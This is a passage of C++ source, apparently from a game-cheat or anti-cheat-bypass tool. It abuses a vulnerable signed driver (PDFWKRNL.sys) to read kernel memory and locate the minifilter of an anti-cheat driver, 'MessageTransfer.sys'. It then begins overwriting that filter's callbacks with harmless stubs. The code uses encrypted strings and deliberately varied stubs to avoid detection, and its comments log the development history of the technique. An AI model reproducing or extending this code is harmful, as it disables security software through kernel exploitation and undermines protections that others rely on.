                // ★ v3.296 FIX-17 DIAG: 如果所有 nameOff 都没找到有效名称, 记录
                if (!nameDumped) {
                    StateLog("FLT", "FilterNoName",
                             "filter=0x%llX flags=0x%llX",
                             (unsigned long long)filterBase,
                             (unsigned long long)flags);
                }

                // 读下一个条目
                uint64_t nextFlink = 0;
                if (!kma.ReadKernelVA(cur, &nextFlink, 8) ||
                    nextFlink < 0xFFFF800000000000ULL) {
                    // ★ v3.296 FIX-18 DIAG: 记录链表遍历中断
                    StateLog("FLT", "StrScanListBreak",
                             "iter=%d cur=0x%llX reason=readfail_or_invalid",
                             iter, (unsigned long long)cur);
                    break;
                }
                // ★ v3.296 FIX-18: 验证 nextFlink 在白名单范围内 — 防止访问已释放内存
                if (nextFlink >= 0xFFFFFD0000000000ULL) {
                    StateLog("FLT", "StrScanListBreak",
                             "iter=%d cur=0x%llX next=0x%llX reason=out_of_whitelist",
                             iter, (unsigned long long)cur, (unsigned long long)nextFlink);
                    break;
                }
                cur = nextFlink;
            }
        }
    }

    // ★ v3.296 DIAG: 汇总诊断 — Release 模式可见
    StateLog("FLT", "StrScanNoFilter",
             "frames=%d lists=%d entries=%d flagsMatch=%d",
             validFrameCount, validListCount, filterEntryCount, flagsMatchCount);
    ByovdDiag("FLT:STRSCAN: no matching FLT_FILTER found in any frame\n");
    return 0;
}

// ★ BUILD 518: 彻底移除 FindFilterByDriverScan — 本质不安全
//   PDFWKRNL.sys 的 memcpy IOCTL 不验证地址, 从驱动 .data 段读取不可信指针值
//   并通过 PDFWKRNL.sys 读取这些指针指向的内存会导致 BSOD。
//   日志确认 BSOD 发生在此函数执行期间 (日志在 DRVSCAN 开始后截断)。
//   改为在 FindFilterByName 外部指针探索中尝试多个 ActiveLink 偏移。

// ★ BUILD 524/526: FindFilterByDriverBaseMatch — 通过驱动基址匹配识别 FLT_FILTER
//   当 Win11 的 Name 字段偏移无法定位时, 改用驱动基址匹配:
//   FLT_FILTER 结构中包含指向驱动代码的指针 (如 Callbacks/DriverObject 等),
//   读取整个 FLT_FILTER 结构 (0x800 字节), 在本地缓冲区中搜索指向
//   [driverBase, driverBase+driverSize) 范围的指针。
//
//   BUILD 525 教训: 阶段2 (读取内核指针指向的内存) 导致 BSOD
//     - PDFWKRNL.sys memcpy 不验证地址, 读取无效内核指针直接蓝屏
//     - FLT_FILTER 结构中可能包含指向已释放池内存或未映射区域的指针
//     - 违反 memory 硬约束: "Do not read from untrusted pointer values"
//
//   BUILD 526: 只保留阶段1 (安全), 移除阶段2 (危险)
//   - 阶段 1: 在 FLT_FILTER 结构中直接搜索指向驱动范围的指针
//             (如 Operations 直接指向驱动, 或 DriverObject 中的 MajorFunction 数组)
//   - 阶段 1 只读取 FLT_FILTER 结构本身的内存 (已知有效内核地址), 不读取指针指向的内容
//   - 添加诊断日志: dump FLT_FILTER 中所有内核指针的偏移和值 (不读取指针指向的内存)
//     帮助定位 DriverObject 偏移, 供后续 BUILD 使用
//
//   安全性保证:
//   - 只读取 FLT_FILTER 结构本身 (fBase + chunkOff), 已知有效内核地址
//   - 分块读取 (0x200 字节/次), 避免跨无效页导致整次读取失败
//   - 绝不读取指针指向的内存 (避免 PDFWKRNL.sys memcpy BSOD)
//
//   FindFilterByDriverScan 的问题: 扫描驱动 .data 段的不可信指针值,
//   然后通过 PDFWKRNL.sys 读取这些指针指向的内存 → 无效地址直接 BSOD
static uint64_t FindFilterByDriverBaseMatch(uint64_t filterListHead,
                                             uint64_t driverBase, uint64_t driverSize,
                                             const wchar_t* filterName) {
    auto& kma = KernelMemoryAccessor::Instance();
    if (!filterListHead || !driverBase || !driverSize) return 0;

    uint64_t driverEnd = driverBase + driverSize;
    ByovdDiag("FLT:NTRL: BUILD 526: driver-base match (phase1 only), FilterList=0x%llX driver=[0x%llX-0x%llX)\n",
        (unsigned long long)filterListHead,
        (unsigned long long)driverBase, (unsigned long long)driverEnd);

    uint64_t current = 0;
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current))) return 0;

    // 遍历 FilterList 链表
    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
        // 尝试多个 ActiveLink 偏移 (Win11 可能与 Win10 不同)
        uint64_t alOffs[] = { 0x008, 0x010, 0x018, 0x020, 0x028, 0x030 };
        for (int ali = 0; ali < 6; ali++) {
            uint64_t fBase = current - alOffs[ali];

            // 阶段 1: 分块读取 FLT_FILTER 结构, 直接搜索驱动范围指针
            //   ★ BUILD 526: 只保留阶段1, 绝不读取指针指向的内存
            for (uint64_t chunkOff = 0; chunkOff < 0x800; chunkOff += 0x200) {
                uint8_t buf[0x200] = {};
                if (!kma.ReadKernelVA(fBase + chunkOff, buf, sizeof(buf))) continue;

                for (int bo = 0; bo < (int)sizeof(buf) - 7; bo += 8) {
                    uint64_t val = *(uint64_t*)(buf + bo);
                    // 阶段 1: 直接匹配 — 指针在驱动范围内
                    if (val >= driverBase && val < driverEnd) {
                        ByovdDiag("FLT:NTRL: BUILD 526: ✓ found '%ls' via direct driver ptr at fBase+0x%llX → 0x%llX (alOff=0x%llX, entry=%d)\n",
                            filterName,
                            (unsigned long long)(chunkOff + bo),
                            (unsigned long long)val,
                            (unsigned long long)alOffs[ali], iter);
                        return fBase;
                    }
                }
            }

            // ★ BUILD 526: 诊断日志 — dump FLT_FILTER 中所有内核指针的偏移和值
            //   只读取 FLT_FILTER 结构本身 (已知安全), 不读取指针指向的内存
            //   帮助定位 DriverObject 偏移, 供后续 BUILD 使用
            //   只对第 1 个条目 dump (避免日志爆炸)
            if (iter == 0 && ali == 0) {
                ByovdDiag("FLT:NTRL: BUILD 526: diag — kernel pointers in FLT_FILTER@0x%llX (alOff=0x%llX):\n",
                    (unsigned long long)fBase, (unsigned long long)alOffs[ali]);
                for (uint64_t chunkOff = 0; chunkOff < 0x800; chunkOff += 0x200) {
                    uint8_t buf[0x200] = {};
                    if (!kma.ReadKernelVA(fBase + chunkOff, buf, sizeof(buf))) continue;
                    for (int bo = 0; bo < (int)sizeof(buf) - 7; bo += 8) {
                        uint64_t val = *(uint64_t*)(buf + bo);
                        if (val >= 0xFFFF800000000000ULL && val < 0xFFFFFFFFFFFFFFFFULL) {
                            uint64_t absOff = chunkOff + bo;
                            ByovdDiag("FLT:NTRL:   +0x%03llX = 0x%llX\n",
                                (unsigned long long)absOff, (unsigned long long)val);
                        }
                    }
                }
                ByovdDiag("FLT:NTRL: BUILD 526: diag end (phase1 found no direct driver ptr)\n");
            }
        }

        // ★ v3.296 FIX-18: 验证 current 在白名单范围内 — 防止访问已释放内存
        if (current >= 0xFFFFFD0000000000ULL) break;
        if (!kma.ReadKernelVA(current, &current, sizeof(current))) break;
    }

    ByovdDiag("FLT:NTRL: BUILD 526: no FLT_FILTER with direct driver ptr in range [0x%llX-0x%llX)\n",
        (unsigned long long)driverBase, (unsigned long long)driverEnd);
    return 0;
}

// 在 FilterList 中查找指定名称的 FLT_FILTER
uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t fltGlobals, const wchar_t* name) {
    auto& kma = KernelMemoryAccessor::Instance();
    ByovdDiag("FLT:NTRL: finding filter '%ls'\n", name);
    // ★ v3.296 FIX-18: 检查 PAC 驱动是否已加载 — 防止 CS2 退出时蓝屏
    //   (与 FindFilterByStringScan/FindPacFilterInKernel 同理)
    {
        char mtName[32];
        STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", mtName, sizeof(mtName));
        uint64_t mtBase = kma.GetKernelModuleBase(mtName);
        SecureZeroMemory(mtName, sizeof(mtName));
        if (!mtBase) {
            StateLog("FLT", "FindByNameSkip", "reason=PAC driver unloaded");
            return 0;
        }
    }

    // BUILD 466 + BUILD 475: FltGlobals 在 Win10/11 版本间布局不同
    //   不再假设 FrameList 在 +0x00 — 尝试 fltGlobals 前 8 个 qword (Win11 可能更远)
    // ★ BUILD 567 v3.296: 扩展到 16 个 qword (0x80 字节), 覆盖 Win11 24H2
    uint64_t globQw[16] = {};
    for (int i = 0; i < 16; i++) {
        kma.ReadKernelVA(fltGlobals + i * 8, &globQw[i], 8);
    }
    ByovdDiag("FLT:NTRL: FltGlobals hex: %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX\n",
        (unsigned long long)globQw[0], (unsigned long long)globQw[1],
        (unsigned long long)globQw[2], (unsigned long long)globQw[3],
        (unsigned long long)globQw[4], (unsigned long long)globQw[5],
        (unsigned long long)globQw[6], (unsigned long long)globQw[7]);
    ByovdDiag("FLT:NTRL: FltGlobals hex: %016llX %016llX %016llX %016llX %016llX %016llX %016llX %016llX\n",
        (unsigned long long)globQw[8], (unsigned long long)globQw[9],
        (unsigned long long)globQw[10], (unsigned long long)globQw[11],
        (unsigned long long)globQw[12], (unsigned long long)globQw[13],
        (unsigned long long)globQw[14], (unsigned long long)globQw[15]);

    // FLTP_FRAME.FilterList 偏移
    // ★ BUILD 567 v3.296 FIX: 扩展搜索范围, 包含 Win11 24H2 的 RegisteredFilters.rList
    //   FLTP_FRAME 布局 (Win10/11 x64):
    //     +0x048 RegisteredFilters (FLT_RESOURCE_LIST_HEAD)
    //       +0x00 rLock (ERESOURCE, ~0x58 bytes)
    //       +0x58 rList (LIST_ENTRY) ← FilterList 在这里!
    //     +0x0c8 AttachedVolumes
    //   所以 rList 在 FLTP_FRAME + 0x048 + 0x58 = +0x0a0
    //   原 bug: 只搜索 0x138-0x300, 完全错过了 0x0a0!
    //   修复: 扩展到 0x080-0x180 (覆盖 RegisteredFilters.rList 在所有 Windows 版本)
    uint64_t filterOffsets[] = {
        // ★ v3.296: 新增 0x080-0x180 范围 (Win11 24H2 RegisteredFilters.rList)
        0x080, 0x088, 0x090, 0x098, 0x0a0, 0x0a8, 0x0b0, 0x0b8,
        0x0c0, 0x0c8, 0x0d0, 0x0d8, 0x0e0, 0x0e8, 0x0f0, 0x0f8,
        0x100, 0x108, 0x110, 0x118, 0x120, 0x128, 0x130, 0x138,
        0x140, 0x148, 0x150, 0x158, 0x160, 0x168, 0x170, 0x178,
        0x180,
        // 保留原 0x188-0x300 范围 (兼容旧版本)
        0x188, 0x190, 0x198, 0x1A0, 0x1A8, 0x1B0, 0x1B8, 0x1C0,
        0x1C8, 0x1D0, 0x1D8, 0x1E0, 0x1E8, 0x1F0, 0x1F8, 0x200,
        0x208, 0x210, 0x218, 0x220, 0x228, 0x230, 0x238, 0x240,
        0x248, 0x250, 0x258, 0x260, 0x268, 0x270, 0x278, 0x280,
        0x288, 0x290, 0x298, 0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0,
        0x2C8, 0x2D0, 0x2D8, 0x2E0, 0x2E8, 0x2F0, 0x2F8, 0x300,
    };

    uint64_t filterListHead = 0;
    uint64_t frameList = 0;

    // ★ BUILD 466: 尝试每个 qword 作为 FrameList 指针 (BUILD 475: 尝试 8 个)
    // ★ BUILD 567 v3.296: 扩展到 16 个 qword
    for (int qi = 0; qi < 16 && !filterListHead; qi++) {
        uint64_t candidateFrame = globQw[qi];
        if (candidateFrame < 0xFFFF800000000000ULL) continue;

        // 验证 candidateFrame 指向的数据是否有效
        uint64_t firstQw = 0;
        if (!kma.ReadKernelVA(candidateFrame, &firstQw, 8)) continue;
        if (firstQw < 0xFFFF800000000000ULL) {
            ByovdDiag("FLT:NTRL: qword[%d]=%016llX rejected (data not kernel ptr)\n",
                qi, (unsigned long long)candidateFrame);
            continue;
        }

        ByovdDiag("FLT:NTRL: try qword[%d]=%016llX as FrameList\n",
            qi, (unsigned long long)candidateFrame);

        for (uint64_t off : filterOffsets) {
            uint64_t addr = candidateFrame + off;
            uint64_t flink = 0, blink = 0;
            if (kma.ReadKernelVA(addr, &flink, sizeof(flink)) &&
                kma.ReadKernelVA(addr + 8, &blink, sizeof(blink))) {
                if (flink != addr && flink > 0xFFFF800000000000ULL && blink > 0xFFFF800000000000ULL) {
                    filterListHead = addr;
                    frameList = candidateFrame;
                    ByovdDiag("FLT:NTRL: FilterList at +0x%llX via qword[%d]\n", off, qi);
                    break;
                }
            }
        }
    }

    if (!filterListHead) {
        ByovdDiag("FLT:NTRL: FilterList not found in any frame candidate\n");

        // 诊断: dump 每个候选的前 4 qword
        for (int qi = 0; qi < 8; qi++) {
            uint64_t cf = globQw[qi];
            if (cf < 0xFFFF800000000000ULL) continue;
            ByovdDiag("FLT:NTRL: frame[%d] hex: ", qi);
            for (int j = 0; j < 4; j++) {
                uint64_t qw = 0;
                kma.ReadKernelVA(cf + j*8, &qw, 8);
                ByovdDiag("%016llX ", (unsigned long long)qw);
            }
            ByovdDiag("\n");
        }

        // ★ BUILD 506: 外部指针探索 — Win11 FilterList 可能存储在池分配中,
        //   通过 FltGlobals 的非 fltmgr 内核指针引用 (与 VerifyFltPipeline BUILD 505 同逻辑)
        // ★ BUILD 524: bestExtPtrForFallback 提升到外部作用域 — 供驱动基址匹配回退使用
        uint64_t bestExtPtrForFallback = 0;
        int bestExtNameCount = 0;
        uint64_t bestExtPtrOff = 0;
        {
            ByovdDiag("FLT:NTRL: BUILD 506: exploring non-flt pointers in FltGlobals...\n");
            uint8_t fgBuf[0x200] = {};
            if (kma.ReadKernelVA(fltGlobals, fgBuf, sizeof(fgBuf))) {
                struct ExtPtr { uint64_t offset; uint64_t value; };
                ExtPtr extPtrs[64] = {};
                int extCount = 0;

                for (int off = 0; off < (int)sizeof(fgBuf) - 7; off += 8) {
                    uint64_t val = *(uint64_t*)(fgBuf + off);
                    // ★ BUILD 515: 包含所有内核指针 (包括 fltmgr 范围内的)
                    //   之前排除 fltmgr 范围导致 +0xA8 的 FilterList 指针被忽略
                    if (val >= 0xFFFF800000000000ULL && val < 0xFFFFFFFFFFFFFFFFULL) {
                        if (extCount < 64) {
                            extPtrs[extCount].offset = off;
                            extPtrs[extCount].value = val;
                            extCount++;
                        }
                    }
                }

                ByovdDiag("FLT:NTRL: BUILD 515: %d kernel pointers (incl. flt range)\n", extCount);
                // ★ BUILD 511: 探索所有外部指针, 跟踪最佳候选 + 多偏移 dump
                //   (bestExtPtrForFallback 已在外部作用域声明 — BUILD 524)

                for (int pi = 0; pi < extCount && !filterListHead; pi++) {
                    uint64_t ptr = extPtrs[pi].value;
                    // 读取该指针指向的内存, 检查是否是 LIST_ENTRY 头
                    uint64_t flink = 0, blink = 0;
                    if (!kma.ReadKernelVA(ptr, &flink, 8)) continue;
                    if (!kma.ReadKernelVA(ptr + 8, &blink, 8)) continue;
                    if (flink == ptr) continue;  // 自引用空链表
                    if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;

                    ByovdDiag("FLT:NTRL: BUILD 511: +0x%llX → 0x%llX valid LIST_ENTRY, searching for '%ls'...\n",
                        extPtrs[pi].offset, (unsigned long long)ptr, name);

                    // ★ BUILD 511: 遍历链表, 查找目标名称, 同时统计命名条目
                    uint64_t cur = flink;
                    int namedCount = 0;
                    int totalCount = 0;  // ★ BUILD 524: 统计总条目数, 供驱动基址匹配回退使用
                    for (int iter = 0; iter < 100 && cur && cur != ptr; iter++) {
                        totalCount++;
                        // ★ BUILD 512: 对第 1 个条目 dump 多候选 fBase 内存 (仅 1 条目, 偏移 0x000-0x038)
                        if (iter == 0) {
                            uint64_t alOffsets[] = {0x000, 0x008, 0x010, 0x018, 0x020, 0x028, 0x030, 0x038};
                            ByovdDiag("FLT:NTRL: BUILD 512: [0] cur=0x%llX multi-fBase dump:\n", (unsigned long long)cur);
                            for (int ali = 0; ali < 8; ali++) {
                                uint64_t fb = cur - alOffsets[ali];
                                uint8_t dump[0x40] = {};
                                if (kma.ReadKernelVA(fb, dump, sizeof(dump))) {
                                    ByovdDiag("FLT:NTRL:   fBase=cur-0x%03llX (0x%llX): %016llX %016llX %016llX %016llX\n",
                                        alOffsets[ali], (unsigned long long)fb,
                                        (unsigned long long)*(uint64_t*)(dump),
                                        (unsigned long long)*(uint64_t*)(dump+8),
                                        (unsigned long long)*(uint64_t*)(dump+16),
                                        (unsigned long long)*(uint64_t*)(dump+24));
                                    // 检查是否包含 "MessageTransfer" 字符串
                                    for (int bo = 0; bo < 0x30; bo += 2) {
                                        wchar_t* wp = (wchar_t*)(dump + bo);
                                        if (wp[0] == 'M' && wp[1] == 'e' && wp[2] == 's' &&
                                            wp[3] == 's' && wp[4] == 'a' && wp[5] == 'g' &&
                                            wp[6] == 'e' && wp[7] == 'T') {
                                            ByovdDiag("FLT:NTRL:   * FOUND 'MessageT...' at fBase+0x%X (cur-0x%03llX)!\n", bo, alOffsets[ali]);
                                        }
                                    }
                                }
                            }
                        }

                        // ★ BUILD 519: 尝试多个 ActiveLink 偏移 — Win11 FLT_FILTER 布局不同
                        // ★ v3.296: 优先尝试标准偏移 0x010 (PrimaryLink.Flink), 然后 0x038 (Name)
                        //   FLT_OBJECT.PrimaryLink.Flink@+0x10, FLT_FILTER.Name@+0x38
                        uint64_t alOffs[] = { 0x010, 0x008, 0x018, 0x020, 0x028, 0x030 };
                        for (int ali = 0; ali < 6; ali++) {
                            uint64_t fBase = cur - alOffs[ali];
                            // ★ v3.296: 优先尝试标准 Name 偏移 0x38, 然后扫描 0x00-0x800
                            uint64_t nameOffs[] = { 0x38, 0x40, 0x48, 0x50, 0x00 };
                            bool nameFound = false;
                            for (int noi = 0; noi < 5 && !nameFound; noi++) {
                                uint64_t noStart = nameOffs[noi];
                                uint64_t noEnd = (noStart == 0x00) ? 0x800 : noStart + 8;
                                for (uint64_t no = noStart; no <= noEnd; no += 8) {
                                    uint16_t nl = 0; uint64_t nb = 0;
                                    if (kma.ReadKernelVA(fBase + no, &nl, sizeof(nl)) &&
                                        kma.ReadKernelVA(fBase + no + 8, &nb, sizeof(nb))) {
                                        if (nl > 0 && nl <= 256 && nl % 2 == 0 &&
                                            nb >= 0xFFFF800000000000ULL && nb < 0xFFFFFD0000000000ULL) {
                                            wchar_t fn[256] = {};
                                            if (ReadKernelUnicodeString(nb, nl, fn, 256) > 0) {
                                                // ★ BUILD 523: 诊断模式 — 打印所有候选 (前3个条目, ali==0)
                                                if (iter < 3 && ali == 0) {
                                                    uint16_t nm = 0;
                                                    kma.ReadKernelVA(fBase + no + 2, &nm, sizeof(nm));
                                                    ByovdDiag("FLT:NTRL: BUILD 523: diag entry[%d] noff=0x%llX nl=%u nm=%u nb=0x%llX str[0]=0x%X\n",
                                                        iter, no, (unsigned)nl, (unsigned)nm, (unsigned long long)nb, (unsigned)fn[0]);
                                                }
                                                // ★ BUILD 521: 严格验证 — minifilter 名称必须以字母开头
                                                wchar_t c0 = fn[0];
                                                bool isAlpha = (c0 >= L'A' && c0 <= L'Z') || (c0 >= L'a' && c0 <= L'z');
                                                if (!isAlpha) continue;

                                                namedCount++;
                                                if (_wcsicmp(fn, name) == 0) {
                                                    filterListHead = ptr;
                                                    StateLog("FLT", "FilterFound",
                                                             "alOff=0x%llX noff=0x%llX filter=0x%llX",
                                                             (unsigned long long)alOffs[ali],
                                                             (unsigned long long)no,
                                                             (unsigned long long)fBase);
                                                    ByovdDiag("FLT:NTRL: BUILD 522: found '%ls' via +0x%llX → 0x%llX (alOff=0x%llX noff=0x%llX) ✓\n",
                                                        fn, extPtrs[pi].offset, (unsigned long long)ptr, alOffs[ali], no);
                                                    goto EXT_PTR_FOUND_511;
                                                }
                                                ByovdDiag("FLT:NTRL: BUILD 522: +0x%llX entry[%d] alOff=0x%llX name='%ls' (noff=0x%llX) — not target\n",
                                                    extPtrs[pi].offset, iter, alOffs[ali], fn, no);
                                                nameFound = true;
                                                goto NEXT_EXT_ENTRY_511;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        NEXT_EXT_ENTRY_511:
                        if (cur >= 0xFFFFFD0000000000ULL) break;  // ★ v3.296 FIX-18: 白名单验证
                        if (!kma.ReadKernelVA(cur, &cur, 8)) break;
                    }
                    ByovdDiag("FLT:NTRL: BUILD 511: +0x%llX → 0x%llX: %d named + %d total entries\n",
                        extPtrs[pi].offset, (unsigned long long)ptr, namedCount, totalCount);
                    // ★ BUILD 511/524/527: 跟踪最佳候选 (即使名称不匹配)
                    //   BUILD 524: 当 namedCount==0 时 (Win11 Name 偏移无法定位),
                    //   改用 totalCount 选择条目数最多的 FilterList, 供驱动基址匹配回退使用
                    //   BUILD 527: 降低 totalCount 阈值从 >=3 到 >=1 — 蓝屏重启后 FilterList
                    //   可能只有 1 个条目 (仅 MessageTransfer), >=3 条件过严导致无法回退
                    if (namedCount > bestExtNameCount) {
                        bestExtNameCount = namedCount;
                        bestExtPtrForFallback = ptr;
                        bestExtPtrOff = extPtrs[pi].offset;
                    } else if (namedCount == 0 && bestExtNameCount == 0 && totalCount >= 1) {
                        // ★ BUILD 524/527: 名称匹配全失败时, 记录第一个有条目的 FilterList
                        if (!bestExtPtrForFallback) {
                            bestExtPtrForFallback = ptr;
                            bestExtPtrOff = extPtrs[pi].offset;
                        }
                    }
                }
                EXT_PTR_FOUND_511:
                ;  // ★ BUILD 550: null statement after label (C++20 compatibility)

                // ★ BUILD 514: 不移除 — 名称匹配失败时不设置 filterListHead
                //   PDFWKRNL.sys memcpy 不验证地址, 从不可信 opsAddr 读取会 BSOD
                //   让代码自然回退到 FindFilterByStringScan + FindPacFilterInKernel
            }
            ByovdDiag("FLT:NTRL: BUILD 506: external pointer exploration complete\n");
        }

        if (!filterListHead) {
            // ★ BUILD 502: FrameList 失败 → 尝试新字符串扫描
            ByovdDiag("FLT:NTRL: FrameList failed, trying BUILD 502 string scan...\n");
            uint64_t strScanResult = FindFilterByStringScan(fltmgrBase, fltGlobals, name);
            if (strScanResult) {
                ByovdDiag("FLT:NTRL: BUILD 502 string scan SUCCESS at 0x%llX\n", (unsigned long long)strScanResult);
                return strScanResult;
            }

            // ★ BUILD 524/526: string scan 失败 → 尝试驱动基址匹配 (仅阶段1, 安全)
            //   Win11 的 FLT_FILTER.Name 偏移无法定位时, 通过搜索 FLT_FILTER 结构中
            //   指向目标驱动范围的指针来识别 minifilter (不依赖 Name 字段)
            //   ★ BUILD 526: 移除阶段2 (读取指针指向的内存导致 BSOD), 只保留阶段1
            if (bestExtPtrForFallback) {
                ByovdDiag("FLT:NTRL: BUILD 526: trying driver-base match (phase1 only) with bestExtPtr=0x%llX (off=0x%llX, named=%d)...\n",
                    (unsigned long long)bestExtPtrForFallback,
                    (unsigned long long)bestExtPtrOff, bestExtNameCount);

                // 获取目标驱动基址和大小
                char drvName[64] = {};
                int nameLen = 0;
                while (name[nameLen] && nameLen < 60) nameLen++;
                for (int i = 0; i < nameLen; i++) drvName[i] = (char)name[i];
                // ★ BUILD 524 fix: ".sys" (4 字符) 不是 ".sy" (3 字符)
                drvName[nameLen] = '.'; drvName[nameLen+1] = 's';
                drvName[nameLen+2] = 'y'; drvName[nameLen+3] = 's'; drvName[nameLen+4] = 0;
                uint64_t mtBase = kma.GetKernelModuleBase(drvName);
                if (mtBase) {
                    uint64_t mtSize = 0;
                    IMAGE_DOS_HEADER mtdos = {};
                    if (kma.ReadKernelVA(mtBase, &mtdos, sizeof(mtdos)) && mtdos.e_magic == IMAGE_DOS_SIGNATURE) {
                        IMAGE_NT_HEADERS64 mtnt = {};
                        if (kma.ReadKernelVA(mtBase + mtdos.e_lfanew, &mtnt, sizeof(mtnt)) && mtnt.Signature == IMAGE_NT_SIGNATURE) {
                            mtSize = mtnt.OptionalHeader.SizeOfImage;
                        }
                    }
                    if (!mtSize) mtSize = 0x400000; // 保守估计 4MB
                    ByovdDiag("FLT:NTRL: BUILD 524: %s at 0x%llX size=0x%llX\n",
                        drvName, (unsigned long long)mtBase, (unsigned long long)mtSize);

                    uint64_t drvMatchResult = FindFilterByDriverBaseMatch(
                        bestExtPtrForFallback, mtBase, mtSize, name);
                    if (drvMatchResult) {
                        ByovdDiag("FLT:NTRL: BUILD 524: ✓ driver-base match SUCCESS at 0x%llX\n",
                            (unsigned long long)drvMatchResult);
                        return drvMatchResult;
                    }
                } else {
                    ByovdDiag("FLT:NTRL: BUILD 524: %s not loaded — cannot do driver-base match\n", drvName);
                }
            }
            return 0;
        }
    }

    // 遍历 FilterList 链表
    // ★ v3.296: FLT_OBJECT.PrimaryLink.Flink@+0x10, FLT_FILTER.Name@+0x38
    //   优先尝试标准偏移, 失败时回退到全范围扫描
    uint64_t nameOffsets[] = {
        // ★ v3.296: 优先标准偏移 0x38
        0x038,
        // 回退: 其他常见偏移
        0x040, 0x048, 0x050, 0x028, 0x030, 0x020, 0x018, 0x010, 0x008, 0x000,
        // 全范围回退 (Win11 兼容)
        0x058, 0x068, 0x078, 0x088, 0x098, 0x0A8, 0x0B8, 0x0C8, 0x0D8,
        0x0E8, 0x0F8, 0x108, 0x118, 0x128, 0x138, 0x148, 0x158, 0x168,
        0x178, 0x188, 0x198, 0x1A8, 0x1B8, 0x1C8, 0x1D8, 0x1E8, 0x1F8,
        0x208, 0x218, 0x228, 0x238, 0x248, 0x258, 0x268, 0x278, 0x288,
        0x298, 0x2A8, 0x2B8, 0x2C8, 0x2D8, 0x2E8, 0x2F8, 0x300,
    };

    uint64_t current = 0;
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current)))
        return 0;

    // ★ BUILD 509: 诊断 — 遍历 FilterList 并打印所有过滤器名称, 帮助定位名称不匹配问题
    //   先统计条目数
    {
        int entryCount = 0;
        uint64_t c = 0;
        if (kma.ReadKernelVA(filterListHead, &c, sizeof(c))) {
            for (int i = 0; i < 100 && c && c != filterListHead; i++) {
                entryCount++;
                if (!kma.ReadKernelVA(c, &c, sizeof(c))) break;
            }
        }
        ByovdDiag("FLT:NTRL: BUILD 509: dumping all %d FilterList entries...\n", entryCount);
    }

    // 重新遍历, 打印每个条目
    if (!kma.ReadKernelVA(filterListHead, &current, sizeof(current)))
        return 0;

    for (int iter = 0; iter < 100 && current && current != filterListHead; iter++) {
        // ★ BUILD 520: 尝试多个 ActiveLink 偏移, 只有非空名称才算有效
        uint64_t activeLinkOffsets[] = { 0x010, 0x008, 0x018, 0x020, 0x028, 0x030 };

        for (uint64_t alOff : activeLinkOffsets) {
            uint64_t filterBase = current - alOff;

            uint8_t fDump[0x80] = {};
            if (!kma.ReadKernelVA(filterBase, fDump, sizeof(fDump))) continue;

            bool foundName = false;
            for (uint64_t nameOff : nameOffsets) {
                uint16_t nameLen = 0;
                uint64_t nameBuf = 0;
                uint64_t uniAddr = filterBase + nameOff;

                if (kma.ReadKernelVA(uniAddr, &nameLen, sizeof(nameLen)) &&
                    kma.ReadKernelVA(uniAddr + 8, &nameBuf, sizeof(nameBuf))) {

                    if (nameLen > 0 && nameLen <= 256 && nameLen % 2 == 0 &&
                        nameBuf >= 0xFFFF800000000000ULL && nameBuf < 0xFFFFFD0000000000ULL) {

                        wchar_t filterName[256] = {};
                        ReadKernelUnicodeString(nameBuf, nameLen, filterName, 256);

                        // ★ BUILD 521: 严格验证 — minifilter 名称必须以字母开头
                        wchar_t c0 = filterName[0];
                        bool isAlpha = (c0 >= L'A' && c0 <= L'Z') || (c0 >= L'a' && c0 <= L'z');
                        if (!isAlpha) continue;

                        ByovdDiag("FLT:NTRL: BUILD 521: [%d] alOff=0x%llX name='%ls' (len=%u noff=0x%llX)\n",
                            iter, alOff, filterName, (unsigned)nameLen, nameOff);
                        foundName = true;

                        if (_wcsicmp(filterName, name) == 0) {
                            ByovdDiag("FLT:NTRL: BUILD 520: found '%ls' at 0x%llX (alOff=0x%llX nameOff=0x%llX)\n",
                                filterName, (unsigned long long)filterBase, alOff, nameOff);
                            return filterBase;
                        }
                    }
                }
            }

            if (foundName) break;
        }

        if (!kma.ReadKernelVA(current, &current, sizeof(current)))
            break;
    }

    ByovdDiag("FLT:NTRL: filter '%ls' not found in FilterList\n", name);

    // ★ BUILD 477: 名称匹配失败 → fallback: 通过回调地址范围匹配
    //   遍历 FilterList, 对每个 FLT_FILTER 读取 Operations 中的回调地址,
    //   检查是否有回调落在目标驱动模块范围内
    //   优点: 不依赖 Name 偏移, 适用于 Win10/11 所有 FLT_FILTER 布局版本
    // ★ BUILD 514: 移除回调范围回退 — 见上方的早期 return

    // ★ BUILD 514: 移除回调范围回退 — PDFWKRNL.sys memcpy 不验证地址, 从不可信 opsAddr 读取会 BSOD
    //   回退由 FindPacFilterInKernel + FindFilterByStringScan 处理
    return 0;
}

// 替换 FLT_FILTER.Operations 数组中所有回调为无害 stub
bool MinifilterNeutralizer::NeutralizeCallbacks(uint64_t filterAddr) {
    auto& kma = KernelMemoryAccessor::Instance();

    // 获取 fltmgr.sys 基址用于 stub 扫描
    uint64_t fltmgrBase = 0;
    {
        char fltName[16];
        STEALTH_STR_DECRYPT_TO("fltmgr.sys", fltName, sizeof(fltName));
        fltmgrBase = kma.GetKernelModuleBase(fltName);
        SecureZeroMemory(fltName, sizeof(fltName));
    }
    if (!fltmgrBase) {
        ByovdDiag("FLT:NTRL: flt not found\n");
        return false;
    }

    // 找到 return-0 stub 地址
    // ★ BUILD 555 P2-3: 多样化 stub — 收集多个不同模式的 stub, 让不同回调指向不同地址
    //   修复原单一 stub 缺陷: 所有 PreOp/PostOp 指向同一地址 → PAC 易扫描检测
    uint64_t stubAddrs[MAX_STUB_INSTANCES] = {};
    size_t stubCount = 0;
    FindRet0Stubs(fltmgrBase, 0x400000, stubAddrs, MAX_STUB_INSTANCES, &stubCount);
    if (stubCount == 0) return false;

    // ★ BUILD 555 P2-3: 判断回调是否已指向任一 stub (多样化场景下)
    auto isStubbedToAny = [&](uint64_t addr) -> bool {
        for (size_t k = 0; k < stubCount; k++) {
            if (stubAddrs[k] == addr) return true;
        }
        return false;
    };

    // Operations 指针偏移 — ★ BUILD 567 v3.296 FIX: 使用固定偏移 +0x1a8 + MJ 验证
    //   原 bug: 在 0x100-0x400 范围取第一个内核指针作为 Operations.
